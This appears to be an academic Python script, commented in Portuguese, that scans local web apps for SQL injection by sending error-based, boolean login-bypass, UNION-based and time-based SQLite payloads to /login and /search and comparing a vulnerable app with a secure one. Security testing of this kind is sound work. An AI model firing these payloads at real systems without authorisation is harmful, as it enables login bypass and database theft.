#!/usr/bin/env python3
"""
SQLi Scanner — Ferramenta de Deteção de SQL Injection
=======================================================
Testa endpoints web à procura de vulnerabilidades de SQL Injection.

Uso:
    python sqli_scanner.py --url http://localhost:5001 --output report.txt
    python sqli_scanner.py --url http://localhost:5001 --verbose
    python sqli_scanner.py --compare

Exemplos de payloads testados:
    - Error-based  : induz erros SQL para detetar vulnerabilidade
    - Boolean-based: testa condições verdadeiras/falsas
    - UNION-based  : tenta extrair dados via UNION SELECT
"""

import requests
import argparse
import sys
import time
from datetime import datetime
from typing import Optional

# ──────────────────────────────────────────────
# Payloads organizados por técnica de ataque
# ──────────────────────────────────────────────

PAYLOADS = {
    "Error-based": [
        "'",
        "''",
        "`",
        "\"",
        "\\",
        "%27",
        "1'",
        "' ;--",
    ],
    "Boolean-based": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "' OR 1=1#",
        "admin' --",
        "admin'/*",
        "' OR 'x'='x",
        "1 OR 1=1",
    ],
    "UNION-based": [
        "' UNION SELECT NULL --",
        "' UNION SELECT NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL --",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT name,sql,3 FROM sqlite_master --",
    ],
    "Time-based (SQLite)": [
        # SQLite não tem SLEEP — usamos operações pesadas como proxy
        "' AND RANDOMBLOB(100000000) AND '1'='1",
    ],
}

# Padrões nos responses que indicam vulnerabilidade
ERROR_SIGNATURES = [
    "sqlite",
    "syntax error",
    "unrecognized token",
    "unclosed quotation",
    "sql error",
    "operationalerror",
    "you have an error in your sql",
    "warning: mysql",
    "pg::syntaxerror",
    "microsoft ole db",
    "odbc sql",
    "jdbc",
    "unterminated string",
    "sqlexception",
    "quoted string not properly terminated",
    "ora-",
    "db2 sql error",
]

SUCCESS_SIGNATURES = [
    "login bem-sucedido",
    "bem-vindo",
    "welcome",
    "logged in",
    "dashboard",
]


# ──────────────────────────────────────────────
# Classes auxiliares
# ──────────────────────────────────────────────

class Colors:
    RED    = '\033[91m'
    GREEN  = '\033[92m'
    YELLOW = '\033[93m'
    BLUE   = '\033[94m'
    PURPLE = '\033[95m'
    CYAN   = '\033[96m'
    WHITE  = '\033[97m'
    BOLD   = '\033[1m'
    DIM    = '\033[2m'
    RESET  = '\033[0m'

    @staticmethod
    def supports_color():
        return hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()


def c(text, color):
    if Colors.supports_color():
        return f"{color}{text}{Colors.RESET}"
    return text


class Finding:
    def __init__(self, endpoint, method, field, payload, technique, evidence, severity):
        self.endpoint  = endpoint
        self.method    = method
        self.field     = field
        self.payload   = payload
        self.technique = technique
        self.evidence  = evidence
        self.severity  = severity  # HIGH / MEDIUM / LOW
        self.timestamp = datetime.now().isoformat()

    def __str__(self):
        return (
            f"[{self.severity}] {self.technique} em {self.method} {self.endpoint}\n"
            f"  Campo   : {self.field}\n"
            f"  Payload : {self.payload}\n"
            f"  Evidência: {self.evidence[:120]}{'...' if len(self.evidence) > 120 else ''}"
        )


# ──────────────────────────────────────────────
# Scanner principal
# ──────────────────────────────────────────────

class SQLiScanner:
    def __init__(self, base_url: str, verbose: bool = False, delay: float = 0.1):
        self.base_url  = base_url.rstrip('/')
        self.verbose   = verbose
        self.delay     = delay
        self.findings  = []
        self.tested    = 0
        self.session   = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SQLiScanner/1.0 (Educational Project)'
        })

    def log(self, msg, level='info'):
        prefix = {
            'info':    c('[*]', Colors.CYAN),
            'ok':      c('[+]', Colors.GREEN),
            'warn':    c('[!]', Colors.YELLOW),
            'vuln':    c('[VULN]', Colors.RED + Colors.BOLD),
            'section': c('[>>]', Colors.PURPLE + Colors.BOLD),
        }.get(level, '[?]')
        print(f"  {prefix} {msg}")

    def vlog(self, msg):
        if self.verbose:
            print(f"       {c('»', Colors.DIM)} {msg}")

    def _check_response(self, response_text: str, original_text: str, payload: str) -> Optional[str]:
        """Analisa a resposta e retorna a evidência se vulnerável, None se seguro."""
        text_lower = response_text.lower()

        # 1. Erro SQL diretamente no response
        for sig in ERROR_SIGNATURES:
            if sig in text_lower:
                return f"Erro SQL detetado: '{sig}'"

        # 2. Login bypass (conteúdo de sucesso em POST com payload injetado)
        for sig in SUCCESS_SIGNATURES:
            if sig in text_lower and sig not in original_text.lower():
                return f"Indicador de sucesso detetado: '{sig}'"

        # 3. Tamanho de resposta muito diferente (pode indicar UNION injection)
        len_orig = len(original_text)
        len_resp = len(response_text)
        if len_orig > 0 and abs(len_resp - len_orig) > len_orig * 0.3 and len_resp > 500:
            return f"Resposta anómala: {len_orig} → {len_resp} bytes (+{len_resp - len_orig})"

        return None

    def _get_baseline(self, url: str, method: str, data: dict) -> str:
        """Obtém resposta base (sem payload) para comparação."""
        try:
            clean_data = {k: 'test_baseline_value' for k in data}
            if method == 'POST':
                resp = self.session.post(url, data=clean_data, timeout=5)
            else:
                resp = self.session.get(url, params=clean_data, timeout=5)
            return resp.text
        except Exception:
            return ""

    def test_endpoint(self, path: str, method: str, fields: list):
        """Testa um endpoint com todos os payloads em todos os campos."""
        url = self.base_url + path
        self.log(f"A testar {method} {path} (campos: {', '.join(fields)})", 'section')

        baseline = self._get_baseline(url, method, {f: 'x' for f in fields})

        for technique, payloads in PAYLOADS.items():
            self.vlog(f"Técnica: {technique}")
            for payload in payloads:
                for field in fields:
                    self.tested += 1
                    data = {f: 'normal_value' for f in fields}
                    data[field] = payload

                    self.vlog(f"Campo={field} | Payload={payload[:50]}")

                    try:
                        if method == 'POST':
                            resp = self.session.post(url, data=data, timeout=5)
                        else:
                            resp = self.session.get(url, params=data, timeout=5)

                        evidence = self._check_response(resp.text, baseline, payload)

                        if evidence:
                            severity = 'HIGH' if 'sql' in evidence.lower() or 'sucesso' in evidence.lower() else 'MEDIUM'
                            finding = Finding(
                                endpoint=path, method=method, field=field,
                                payload=payload, technique=technique,
                                evidence=evidence, severity=severity
                            )
                            self.findings.append(finding)
                            self.log(
                                f"{c('VULNERABILIDADE ENCONTRADA', Colors.RED + Colors.BOLD)} "
                                f"| campo={c(field, Colors.YELLOW)} "
                                f"| payload={c(payload[:40], Colors.PURPLE)}",
                                'vuln'
                            )
                            self.log(f"Evidência: {evidence}", 'warn')

                    except requests.exceptions.ConnectionError:
                        self.log(f"Servidor não acessível em {url}", 'warn')
                        return
                    except Exception as e:
                        self.vlog(f"Erro: {e}")

                    time.sleep(self.delay)

    def run(self):
        """Executa o scan completo."""
        print()
        print(c("═" * 60, Colors.CYAN))
        print(c("  SQLi Scanner — Deteção de SQL Injection", Colors.BOLD + Colors.WHITE))
        print(c("  Projeto Académico — Fins Educativos", Colors.DIM))
        print(c("═" * 60, Colors.CYAN))
        print(f"\n  Alvo    : {c(self.base_url, Colors.YELLOW)}")
        print(f"  Início  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Verbose : {'sim' if self.verbose else 'não'}")
        print()

        # Endpoints a testar
        endpoints = [
            ('/login',  'POST', ['username', 'password']),
            ('/search', 'POST', ['term']),
        ]

        for path, method, fields in endpoints:
            self.test_endpoint(path, method, fields)
            print()

        self._print_summary()
        return self.findings

    def _print_summary(self):
        print(c("═" * 60, Colors.CYAN))
        print(c("  RELATÓRIO FINAL", Colors.BOLD + Colors.WHITE))
        print(c("═" * 60, Colors.CYAN))
        print(f"\n  Testes executados : {self.tested}")
        print(f"  Vulnerabilidades  : {c(str(len(self.findings)), Colors.RED if self.findings else Colors.GREEN)}")
        print()

        if not self.findings:
            print(c("  ✅ Nenhuma vulnerabilidade detetada!", Colors.GREEN + Colors.BOLD))
        else:
            print(c(f"  ⚠️  {len(self.findings)} vulnerabilidade(s) encontrada(s):\n", Colors.RED + Colors.BOLD))
            for i, f in enumerate(self.findings, 1):
                sev_color = Colors.RED if f.severity == 'HIGH' else Colors.YELLOW
                print(f"  {i}. [{c(f.severity, sev_color)}] {f.technique}")
                print(f"     Endpoint : {f.method} {f.endpoint}")
                print(f"     Campo    : {c(f.field, Colors.YELLOW)}")
                print(f"     Payload  : {c(f.payload, Colors.PURPLE)}")
                print(f"     Evidência: {f.evidence[:100]}")
                print()

        print(c("═" * 60, Colors.CYAN))

    def save_report(self, output_path: str):
        """Guarda o relatório num ficheiro de texto."""
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write("SQLi Scanner — Relatório de Segurança\n")
            f.write("=" * 60 + "\n")
            f.write(f"Alvo      : {self.base_url}\n")
            f.write(f"Data/Hora : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Testes    : {self.tested}\n")
            f.write(f"Findings  : {len(self.findings)}\n\n")

            if not self.findings:
                f.write("RESULTADO: Nenhuma vulnerabilidade detetada.\n")
            else:
                f.write(f"RESULTADO: {len(self.findings)} vulnerabilidade(s) encontrada(s)\n\n")
                for i, finding in enumerate(self.findings, 1):
                    f.write(f"--- Finding #{i} ---\n")
                    f.write(str(finding) + "\n\n")

            f.write("=" * 60 + "\n")
            f.write("Gerado por SQLiScanner — Projeto Académico 2025/2026\n")
            f.write("AVISO: Usar apenas em sistemas próprios ou com autorização.\n")

        print(f"\n  📄 Relatório guardado em: {c(output_path, Colors.CYAN)}")


# ──────────────────────────────────────────────
# Modo comparativo (vulnerável vs. segura)
# ──────────────────────────────────────────────

def run_comparison():
    """Executa o scanner contra ambas as apps e compara os resultados."""
    print(c("\n🔬 MODO COMPARATIVO: App Vulnerável vs. App Segura\n", Colors.BOLD + Colors.WHITE))

    targets = [
        ("App VULNERÁVEL (porta 5001)", "http://localhost:5001"),
        ("App SEGURA     (porta 5002)", "http://localhost:5002"),
    ]

    results = {}
    for label, url in targets:
        print(c(f"\n{'─'*50}", Colors.CYAN))
        print(c(f"  A testar: {label}", Colors.BOLD))
        print(c(f"{'─'*50}", Colors.CYAN))

        try:
            scanner = SQLiScanner(url, verbose=False, delay=0.05)
            findings = scanner.run()
            results[label] = len(findings)
        except Exception as e:
            print(f"  Erro: {e}")
            results[label] = -1

    # Sumário comparativo
    print(c("\n" + "═" * 60, Colors.PURPLE + Colors.BOLD))
    print(c("  COMPARAÇÃO FINAL", Colors.BOLD + Colors.WHITE))
    print(c("═" * 60, Colors.PURPLE + Colors.BOLD))

    for label, count in results.items():
        if count == -1:
            status = c("❌ Erro (servidor indisponível?)", Colors.YELLOW)
        elif count == 0:
            status = c(f"✅ 0 vulnerabilidades — SEGURA", Colors.GREEN + Colors.BOLD)
        else:
            status = c(f"⚠️  {count} vulnerabilidade(s) — INSEGURA", Colors.RED + Colors.BOLD)
        print(f"  {label}: {status}")

    print(c("═" * 60, Colors.PURPLE + Colors.BOLD))


# ──────────────────────────────────────────────
# Entry point
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description='SQLi Scanner — Ferramenta educativa de deteção de SQL Injection',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  python sqli_scanner.py --url http://localhost:5001
  python sqli_scanner.py --url http://localhost:5001 --verbose
  python sqli_scanner.py --url http://localhost:5001 --output report.txt
  python sqli_scanner.py --compare
        """
    )
    parser.add_argument('--url',     help='URL base do alvo (ex: http://localhost:5001)')
    parser.add_argument('--verbose', action='store_true', help='Mostra todos os testes')
    parser.add_argument('--output',  help='Guarda relatório num ficheiro .txt')
    parser.add_argument('--compare', action='store_true',
                        help='Compara app vulnerável (5001) com segura (5002)')
    parser.add_argument('--delay',   type=float, default=0.05,
                        help='Delay entre pedidos em segundos (default: 0.05)')

    args = parser.parse_args()

    if args.compare:
        run_comparison()
        return

    if not args.url:
        parser.print_help()
        print(c("\n⚠️  Erro: use --url ou --compare\n", Colors.YELLOW))
        sys.exit(1)

    scanner = SQLiScanner(args.url, verbose=args.verbose, delay=args.delay)
    scanner.run()

    if args.output:
        scanner.save_report(args.output)


if __name__ == '__main__':
    main()
